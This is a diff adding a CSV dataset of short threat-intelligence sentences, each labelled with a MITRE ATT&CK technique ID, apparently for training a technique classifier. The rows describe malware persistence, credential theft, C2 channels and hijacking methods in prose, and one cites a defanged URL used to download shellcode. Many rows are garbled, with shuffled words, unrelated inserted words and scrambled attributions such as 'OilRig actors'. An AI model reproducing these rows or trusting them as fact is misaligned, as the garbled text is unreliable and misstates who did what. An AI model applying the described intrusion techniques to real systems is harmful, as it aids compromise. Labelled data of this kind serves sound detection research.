@@ -1,0 +1,1525 @@
+text,labels
+The Azure CLI  also provides an interface to obtain user accounts with authenticated access to a domain.,T1087
+Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem.,T1055
+SpicyOmelette has collected data and other information from a compromised.,T1005
+"After Comnie has been copied to the %TEMP% directory, it will look for the presence the ‘DQuit.tmp’ file this path",T1074
+"Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux.",T1547
+Leviathan has downloaded additional scripts and files from adversary-controlled servers.,T1105
+"In practice this is nearly every program, since user32.dll is a very common library.",T1546
+Clop has used the sleep command to avoid sandbox detection.,T1497
+DOGCALL is capable of capturing screenshots of the victims machine.,T1113
+"A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur.",T1588
+Taidoor can upload datum and files from a victims machine.,T1005
+"After creating a new service for persistence, TDTESS sets the file creation time for the service to the creation time of the victims legitimate svchost.exe file.",T1070
+"Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports",T1071
+direct Adversaries may also steal code signing materials directly from a compromised third-party.,T1588
+XCSSET saves a screen capture of the victims system with a numbered filename and .jpg extension.,T1113
+"In addition to downloading free the from malware internet, adversaries may purchase these capabilities from third-party entities.",T1588
+S-Type uses Base64 encoding for C2.,T1132
+"Sharpshooters first-stage downloader resolved various Windows libraries and APIs, including LoadLibraryA, GetProcAddress, and CreateProcessA.",T1106
+Conficker terminates various services related to system security and Windows.,T1562
+Remexi silently executes received commands with cmd.exe.,T1059
+Application and network credentials are stored in the credential Windows Credentials locker.,T1555
+SMOKEDHAM can capture screenshots background of the victim’s desktop.,T1113
+Egregor has used the Windows API difficult make detection more to.,T1106
+"Turla has used malware obtained after compromising other OilRig actors, such as threat.",T1588
+BADFLICK has the communication to delayed actor-controlled IP address by 5 minutes.,T1497
+Adversaries may create or edit shortcuts to run a program during system boot or user login.,T1547
+Adversaries may use an external proxy to as an intermediary for network communications to a command and control to avoid direct connections to their infrastructure.,T1090
+has used a Python tool named Browdec.exe to steal browser credentials.,T1555
+Tropic Trooper has monitored files modified time.,T1083
+"yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .accompany xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.",T1005
+zwShell can obtain the name of the logged-in user on the victim.,T1033
+The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload,T1132
+Avaddon various modifies several registry keys for persistence and UAC bypass.,T1112
+"OwaAuth captures and DES-encrypts credentials before writing the username and password to a log file, C:\log.txt.",T1056
+SMOKEDHAM has modified the Registry to hide created user accounts from the Windows logon screen.,T1564
+Pony has used several Windows functions for various purposes.,T1106
+"Kessel has collected the system architecture, OS version, and MAC address information.",T1082
+CORESHELL can communicate over HTTP for C2.,T1071
+NotPetya creates a task to reboot the system one hour after infection.,T1053
+APT29 has used social media platforms to hide communications to C2 servers.,T1102
+OceanSalt can collect the victim’s IP address.,T1016
+"APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.",T1027
+Smoke Loader searches for credentials stored from web browsers.,T1555
+"While Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a users desktop hoping that a user will click on it.",T1204
+"Most Sakula samples maintain persistence by setting the Registry Run key SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample.",T1547
+RTM has been delivered via spearphishing attachments disguised as PDF documents.,T1566
+An adversary may compress and/or encrypt data that is collected prior to exfiltration.,T1560
+Catchamas captures screenshots based on keywords in the window’s title.,T1113
+Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools  used to block execution and/or uncover artifacts of Persistence.,T1553
+"Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on.",T1082
+Catchamas captures screenshots based on the keywords in specific window’s title.,T1113
+HOPLIGHT has the ability to connect to a remote host in order to upload and download files.,T1105
+"(Source: SecureWorks) Reentry attempt After BRONZE UNION a evicted from and compromised environment, which involved blocking the groups known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells a was backup web shell it had deployed during the intrusion",T1505
+Adversaries may find vulnerability information conclude by searching open databases or gaining access to closed vulnerability databases.,T1588
+Daserf can take screenshots.,T1113
+Encoded Payload   Decoded Payload     i MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT quintet sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the feature command export and control (C2) server,T1132
+P8RAT can check compromise the compromised host for processes associated with VMware or VirtualBox environments.,T1497
+NETWIRE has been executed through use of VBScripts.,T1059
+China Choppers server component can download remote files.,T1105
+Agent Tesla has been executed through malicious e-mail attachments  Pony has attempted to lure targets into downloading an attached executable  or document .,T1204
+KOMPROGO is capable of running WMI queries.,T1047
+"Higaisa collected the system volume serial number, GUID, and computer name.",T1082
+"Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window.",T1218
+"Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts.",T1574
+ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32.,T1546
+Carbanak may use netsh to add local firewall rule exceptions.,T1562
+PUNCHBUGGY can gather system information such as computer names.,T1082
+Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.,T1547
+MESSAGETAP stored targeted SMS messages that matched its target list in CSV files on inward the compromised system.,T1074
+Epic has overwritten the function pointer in the extra window memory of Explorers Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.,T1055
+"BRONZE BUTLER has used various tools to download files, including DGet .",T1105
+WastedLocker can modify registry values within the Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap registry primal.,T1112
+Metamorfo has used MsiExec.exe to automatically execute files.,T1218
+StrongPity can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.,T1560
+"Apple also America a adjust of keys and algorithms to encrypt the user’s password, but once the superior key is found, an attacker need only iterate over the other values to unlock the final password.",T1555
+Metamorfo amass a list of installed antivirus software from the victim’s system.,T1518
+An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.,T1218
+"Silence can create, cancel, or modify a specified Registry key or value.",T1112
+"11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz",T1071
+"Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.",T1574
+The same situation applies to authentication by key pair – the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used,T1056
+decode script is used to The and execute create following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.to (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed jpg perform two actions:Create persistence to execute registry Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to the a the key in order to execute the Windows-KB275122-x86.exe file previously downloaded,T1106
+"Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables",T1033
+mastery BADNEWS has a command to take a screenshot and send it to the C2 server.,T1113
+"A tool can be used for malicious purposes by an adversary, but  were not intended to be used for those purposes .",T1588
+WellMess has used Base64 encoding to uniquely place communication to and from the C2.,T1132
+The file collection tool used by RainyDay can utilize native API including ReadDirectoryChangeW for folder monitoring.,T1106
+Sibot has used WMI to distinguish network connections and configurations.,T1047
+Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.,T1105
+Successful execution of the macro within the malicious document results in the installation of APT28’s signature GAMEFISH malware,T1204
+Dragonfly 2.0 has used various forms of spearphishing in attempts to get users to open attachments.,T1204
+StrongPity can use multiple layers of proxy servers to hide terminal nodes in its.,T1090
+"InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.",T1027
+StrongPity can delete previously exfiltrated files from the compromised host.,T1070
+Zebrocy has used URL/Percent Encoding on data exfiltrated via HTTP requests.,T1132
+RGDoor establishes persistence on webservers as an IIS module.,T1505
+Adversaries may use methods of capturing user input to obtain credentials or collect information.,T1056
+"Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts",T1547
+"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.",T1003
+Bankshot gathers domain and account done names/information through process monitoring.,T1087
+"(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant is executed",T1546
+A Word document delivering TYPEFRAME prompts the user to enable macro execution.,T1204
+IcedID has WMI to execute binaries.,T1047
+Bazar can key the installed antivirus engine.,T1518
+"If the quarantine represent flag is set in macOS 10.15+, Gatekeeper axerophthol also checks for a notarization ticket and sends a cryptographic hash to Apples servers to check for validity for all unsigned executables.",T1553
+Revenge RAT collects the IP address and MAC address from the system.,T1016
+"RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to tick for attest that the script might be executing within an analysis environment.",T1497
+Metamorfo has used VMProtect to pack and protect files.,T1027
+ZxShell has remote desktop functionality.,T1021
+Bundlore will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion.,T1082
+TA551 has used regsvr32.exe to load malicious DLLs.,T1218
+"If this object is additional found, the macro will exit without downloading not payloads.",T1497
+BLUELIGHT can collect the username on a compromised host.,T1033
+Darkhotel has used malware that repeatedly checks the mouse system position to determine if a real user is on the cursor.,T1497
+EvilBunny has been observed querying installed antivirus software.,T1518
+Caterpillar WebShell has a command to modify a Registry key.,T1112
+"Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding admittance with banners exponent identifying the server software and version number.Secure both the operating system practically and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration sanitize testing on web services.ascendancy Ensure error power messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only disenable those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle overhaul of “Least Privilege” to all systems and services",T1505
+Adversaries may check for Internet connectivity on compromised systems.,T1016
+Turla has used spearphishing emails to deliver BrainTest as a malicious attachment.,T1566
+Vasport is capable of tunneling though a proxy.,T1090
+Cobalt Group has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.,T1204
+Kessel can privy RC4-encrypt credentials before sending to the C2.,T1560
+SDBbot has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege.,T1547
+Adversaries may also install malicious IIS modules to observe and/or modify traffic.,T1505
+Bisonal can execute ipconfig on the victim’s machine.,T1016
+"Magic Hound has Havij and used open-source penetration testing tools like obtained, sqlmap, Metasploit, and Mimikatz.",T1588
+May Adversaries may try to dump Exchange address lists such as global address lists .,T1087
+AppleSeed can stage lodge in a central location prior to exfiltration.,T1074
+Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.,T1505
+Windshift has used malware to enumerate active processes.,T1057
+BackdoorDiplomacy has copied files of interest the main drives recycle bin.,T1074
+BackConfig has the ability to set folders or files to be hidden from the Windows Explorer nonpayment view.,T1564
+GrimAgent has the ability to enumerate files and directories on a compromised host.,T1083
+PROMETHIUM has signed code with self-signed credential.,T1553
+"After a user logs on, the system generates and stores LSASS variety of credential materials in a process memory.",T1003
+Evilnum has sent spearphishing emails containing a link to a zip file hosted on Google Drive.,T1566
+ROKRAT checks for debugging dick.,T1518
+GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.,T1047
+KARAE can use public cloud-based storage providers for command and control.,T1102
+"Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.",T1574
+"The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response",T1071
+"Once infected, victims will reach out to and be redirected by erstwhile these resolvers.",T1102
+"XAgentOSX contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.",T1056
+FLASHFLOOD stages data it copies from the local system removable drives in the %WINDIR%\$NtUninstallKB885884$\ directory.,T1074
+Chaes stored its instructions in charge a config file in the Registry.,T1112
+Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign,T1033
+"This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since its something they were expecting.",T1566
+SUNSPOT monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525.,T1057
+LoudMiner can automatically launch at startup if the AutoStart option is enabled in the VBoxVmService configuration file.,T1547
+The binary will then be executed by the system when the authentication packages are loaded.,T1547
+CopyKittens has used Metasploit and Empire for post-exploitation activeness.,T1588
+Goopy has used a polymorphic decryptor to decrypt itself at runtime.,T1140
+SUPERNOVA is a Web scale.,T1505
+These implementations exist for every major OS but are typically platform specific.,T1055
+Hancitor has used a angstrom macro to check that an ActiveDocument shape object in the lure message is present.,T1497
+APT29 used UPX to pack files.,T1027
+Pysa has modified the registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System” and added the ransom limited note.,T1112
+The string is formatted as “<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<uttermost requests>|<query types>|<hibridMode>|<current query mode>”   ^slp set the sleep and jitter values   ^exit Exits the Trojan    tabularise quint Commands usable within the C# variant of RogueRobin Using Google repulse for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new 100# variant is the x_mode,T1102
+"QakBot can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe.",T1055
+"Files and folders that start with a period, ‘.’, are by default hidden from being view in the Finder application and standard command-line utilities comparable “ls”.",T1564
+"Adversaries may purchase or steal SSL/TLS certificates to further operations, as encrypting C2 traffic  with Web Protocols enabling Adversary-in-the-Middle if the certificate is trusted or otherwise added to the root of trust  Install Root Certificate.",T1588
+Valak has the ability to modify the Registry key HKCU\Software\ApplicationContainer\Appsw64 to store information regarding the waiter C2 server and downloads.,T1112
+PUNCHBUGGY mimics filenames from %SYSTEM%\System32 to hide DLLs in %WINDIR% and/or %TEMP%.,T1036
+"BadPatch collects rar from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .files, .zip, .doc, .docx.",T1005
+Additionally it checks to determine if common analysis tools are currently running on the infected system,T1518
+Magic Hound has used RAR to stage and compress local folders.,T1560
+Kimsuky has gathered credentials using Mimikatz and ProcDump.,T1003
+may Adversaries register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.,T1505
+scrutinize ISAPI filters and search for web shells on Microsoft Exchange servers,T1505
+Bundlore can persist via a LaunchAgent.,T1543
+BADNEWS attempts to hide its payloads using legitimate filenames.,T1036
+SideTwist has ability to upload files from a compromised host.,T1005
+Smoke Loader uses HTTP for C2.,T1071
+Bankshot creates processes using the Windows API calls: CreateProcessA and CreateProcessAsUserA.,T1106
+"Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.channels and pomf.cat were used as com with the different malware stages before achieving a full RAT implementation, which then communicates for the corresponding C2 server",T1102
+An APT28 loader Trojan uses a cmd.exe and batch script to run its payload.,T1059
+Wizard Spider has practice a module named NewBCtestnDll64 as a reverse SOCKS proxy.,T1090
+"The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden",T1564
+Tropic Trooper has used SSL to connect to C2 servers.,T1573
+PlugX checks if VMware tools is running in the background by searching for any process named trenchant vmtoolsd.,T1497
+"Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors.",T1547
+Inception has used malicious HTA files to drop and execute malware.,T1218
+Suckfly used a signed credential-dumping tool to account victim obtain credentials.,T1003
+"When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:  %PROGRAMDATA%\Microsoft\DeviceSync\VMwareCplLauncher.exe %PROGRAMDATA%\Microsoft\DeviceSync\vmtools.dll %PROGRAMDATA%\Microsoft\DeviceSync\MSBuild.exe  In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload",T1036
+Adversaries may acquire information about vulnerabilities that can be used during targeting.,T1588
+jRAT uses WMIC merchandise to identify anti-virus products installed on the victim’s machine and to obtain firewall details.,T1047
+"The White Company has checked for specific antivirus products on the target’s computer, including merchandise Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.",T1518
+AppleJeus has collected the victim host information after infection.,T1082
+Sowbug has used keylogging tools.,T1056
+Crutch has staged stolen files the C:\AMD\Temp directory.,T1074
+InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe.,T1218
+"DCOM can also execute macro in existing documents and may also invoke Dynamic Data Exchange  implementation directly through a COM created instance of a Microsoft Office application, bypassing the take for a malicious document.",T1021
+"By using this technique, the malware or able to leverage itself from a security and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe is unins000.exe exists, a signed and verified signed product process",T1553
+Silence has used for RDP lateral movement.,T1021
+Operation Wocaos backdoors have been written in Python and compiled with py2exe.,T1059
+Unknown Logger is capable of downloading remote files.,T1105
+They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program.,T1547
+capture screenshot,T1113
+ISAPI extensions and filters may have access to all IIS web requests and.,T1505
+PinchDuke steals credentials from compromised hosts.,T1555
+"Additionally, it is possible to avoid setting this flag utilize Drive-by Compromise, which may bypass Gatekeeper.",T1553
+A menuPass macro deletes files after it has decoded and decompressed them.,T1070
+"Ramsay can use Windows API functions such as WriteFile, CloseHandle, and GetCurrentHwProfile during its collection and file storage operations.",T1106
+Machete created their own directories to drop files.,T1074
+Bytes are rotated by four positions and XORed with 0x23.,T1560
+"In this particular instance, the payload is encoded via base64, which certutil decodes",T1140
+"In addition, if an adversary places a program called net.com in the same directory as net.exe, then cmd.exe /C net user will execute net.com instead of net.exe due to the order of executable extensions defined under PATHEXT.",T1574
+KillDisk has called the Windows API to retrieve the hard disk wield and shut down the machine.,T1106
+This utility is able to complicated WQL queries and WMI methods,T1047
+This behavior is related to Bypass User Account Control.,T1574
+"Turla has used malware obtained after compromising other threat actors, such as actor OilRig.",T1588
+BONDUPDATER is written in PowerShell.,T1059
+"The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",T1016
+StrongPity can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.,T1090
+NETWIRE stores its configuration file within Registry the.,T1112
+PinchDuke credentials from compromised hosts.,T1555
+ComRAT can use email attachments for command and control.,T1071
+GrimAgent can identify the user id on a target machine.,T1033
+Hancitor has used a macro to check that an ActiveDocument shape object the lure message is present.,T1497
+"Typical web servers only applications and require GET, POST, and operating.Where possible, minimize server fingerprinting by configuring web regularly to avoid only with banners identifying the server software and version number.Secure both the apply system and the application.Update and type-safe production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using patch stored procedures and should too.Audit transaction logs servers for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose statements much information.Permissions, Privileges, and Access ControlsSystem operators prepared take the following steps to limit permissions, privileges, and access controls.Reduce privileges to responding those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and HEAD the principle of “Least Privilege” to all systems and services",T1505
+Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols.,T1562
+Taidoor has modified the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key for persistence.,T1547
+BBSRAT can compress data with ZLIB prior to sending it back to the C2 server.,T1560
+Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.,T1573
+"If Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:   It will target unins000.exe if it is available",T1218
+Metamorfo a list of installed antivirus software from the victim’s system.,T1518
+Bazar downloads have been host on Google Docs.,T1102
+Higaisa has called various APIs OS native.,T1106
+Adversaries may use hidden windows to malicious conceal activity from the plain sight of users.,T1564
+FLASHFLOOD also collects information stored in the Windows Address book.,T1005
+"Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business",T1021
+has BADFLICK uploaded files from victims machines.,T1005
+"APT12 has used the RIPTIDE RAT, which communicates over HTTP with a payload encrypted with RC4.",T1573
+NETWIRE has expend web services including Paste.ee to host payloads.,T1102
+This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.,T1070
+Gorgon Group has obtained and put-upon tools such as QuasarRAT and Remcos.,T1588
+NETWIRE has been spread via e-mail campaigns utilizing malicious links.,T1566
+Regin contains a keylogger.,T1056
+Turian can establish persistence by adding Registry Run keys.,T1547
+collected SUNBURST information from a compromised host.,T1005
+ChChes collects the victims %TEMP% directory path and version of Internet Explorer.,T1083
+The Azure CLI  also provides an interface to obtain authenticated accounts with user access to a domain.,T1087
+Compromised systems may leverage popular websites and social media to command and control  instructions.,T1102
+ThiefQuest America various API to perform behaviors such as executing payloads and performing local enumeration.,T1106
+Windshift has used icons mimicking MS Office files to mask malicious executables.,T1036
+Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsofts TechNet portal,T1102
+SNUGRIDE encrypts C2 traffic using AES with a static key.,T1573
+Machete searches the File system for files of interest.,T1005
+ComRAT has encrypted and stored its orchestrator code in Registry as well as a PowerShell script the WsqmCons Registry key.,T1112
+"This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the Golden Time campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group",T1105
+Smoke Loader adds a Visual Basic script in the Startup folder to deploy the payload.,T1059
+RainyDay can use services to establish persistence.,T1543
+InvisiMole uses HTTP for C2 communications.,T1071
+"Here is a list of the platforms used by this variant: chirrup, Yandex and Mediafire",T1102
+KARAE public use can cloud-based storage providers for command and control.,T1102
+Wizard Spider has used ipconfig to identify the network configuration of a victim machine.,T1016
+More information about the OwaAuth web Appendix is available in shell C,T1505
+AuditCred can delete files from the system.,T1070
+StoneDrill can assume take screenshots.,T1113
+ROKRAT steals credentials by leveraging the windowpane Vault mechanism.,T1555
+APT29 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.,T1087
+as thousands of similar API functions exist for various system operations.,T1106
+Zebrocy has used URL/Percent Encoding on data exfiltrated via HTTP POST requests.,T1132
+"Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program.",T1036
+A notable characteristic CopyKittens is the use of DNS for command and control communication (&C) and for data exfiltration,T1132
+MESSAGETAP checks for the existence of two configuration files  and attempts to read the files every 30 seconds.,T1083
+"Metamorfo has configured persistence to the Registry ket HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe and used .LNK files in the startup folder to achieve persistence.",T1547
+"TSCookie has the ability to steal saved passwords from the Internet Explorer, Edge, cyberspace Firefox, and Chrome browsers.",T1555
+Bankshot decodes embedded XOR strings.,T1140
+"Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)",T1105
+TINYTYPHON installs itself under Registry Run key to establish persistence.,T1547
+APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events.,T1070
+"jRAT can capture passwords from common web browsers such as Internet Explorer, Google Chrome, and Firefox.",T1555
+Kasidet can execute commands using cmd.exe.,T1059
+PoetRAT has the ability to list files upon receiving the ls command from C2.,T1083
+LoudMiner deleted installation files after completion.,T1070
+"Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",T1566
+Bandook is capable of taking an image of and uploading the current desktop.,T1113
+Command and control  information can be encoded using encoding non-standard data a system that diverges from existing protocol specifications.,T1132
+"Upon exiting, /etc/zlogout and ~/.zlogout are executed.",T1546
+Ramsay can collect directory and file lists.,T1083
+APT40 relies heavily on web shells for an initial foothold into an administration organization,T1505
+JSS Loader has the ability to download malicious executables to a compromised host.,T1105
+"Control Panel items are registered executable  or Control Panel  files, the latter are actually renamed dynamic-link library  files that export a CPlApplet function.",T1218
+"Otherwise, it runs a search for the “/bin/rsyncd” string within the files found in the /etc/ folder",T1083
+Turla RPC backdoors have included local UPnP RPC proxies.,T1090
+UNC2452 obtained list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.,T1087
+"Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system.",T1112
+APT39 has used tools with the ability to search for files on a compromised host.,T1083
+Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands.,T1059
+Pillowmint has deleted the filepath %APPDATA%\Intel\devmonsrv.exe.,T1070
+"RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.",T1082
+"Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.",T1082
+CostaBricks has the ability to use bytecode to decrypt embedded payloads.,T1140
+BLACKCOFFEE has the capability to create a reverse shell.,T1059
+BRONZE BUTLER has used schtasks to register a scheduled task to tan execute malware during lateral movement.,T1053
+AuditCred can inject code from files to other running processes.,T1055
+HOPLIGHT can launch cmd.exe to execute commands on the system.,T1059
+A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&data) and for C exfiltration,T1132
+Javali can read C2 information from Google Documents papers and YouTube.,T1102
+Some InnaputRAT variants create a new Windows service to establish persistence.,T1543
+Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found.,T1082
+SUNBURST self-possessed information from a compromised host.,T1005
+"A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk",T1027
+"Adversaries may install malicious ISAPI extensions and filters dealings to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic.",T1505
+Gallmaker sent victims a lure document with a warning that asked victims to “enable content” for execution.,T1204
+QakBot can use large file sizes to evade detection.,T1027
+Bazar can use HTTP and HTTPS over ports 80 and 443 in C2 communications.,T1071
+FIN6 has used Pastebin and Google Storage to host content for their operations.,T1102
+PLEAD has the ability to steal saved passwords from Microsoft Outlook.,T1555
+Avenger has the ability to use Tasklist to identify running processes.,T1057
+"RTM has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.",T1027
+Webshell to wield access to victim networks.,T1505
+Remexi accept screenshots of windows of interest.,T1113
+Comnie uses blogs and third-party sites  to avoid DNS-based blocking of their communication to the command and control server.,T1102
+PipeMon can check for the presence of ESET and Kaspersky surety software.,T1518
+This is done for the sake of evading defenses and observation.,T1036
+AppleSeed has the ability to Base64 encode its payload and custom encrypt API calls.,T1027
+"Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.",T1082
+"The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.   The file’s path",T1105
+DarkComet gathers the from the victim’s machine.,T1033
+drives has copied files of interest to the main BackdoorDiplomacy recycle bin.,T1074
+Hancitor has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode.,T1106
+A module in Prikormka collects information from the victim about its IP addresses and MAC addresses.,T1016
+"BACKSPACE will attempt to establish a C2 channel, then will examine open package windows to identify a pop-up from the firewall software and will simulate a mouse-click to leave allow the connection to proceed.",T1562
+FIN8 has also WMIC for lateral movement as well as during and post compromise cleanup activities.,T1047
+"The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool",T1546
+"H1N1 dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.",T1555
+APT37 has sent spearphishing attachments attempting to get a user to open them.,T1204
+gh0st grass has altered the InstallTime subkey.,T1112
+PUNCHTRACK is loaded and executed by a highly obfuscated launcher.,T1027
+KeyBoy installs a keylogger for intercepting credentials and keystrokes.,T1056
+Indrik Spider has attempted to get users to click on a malicious zipped file.,T1204
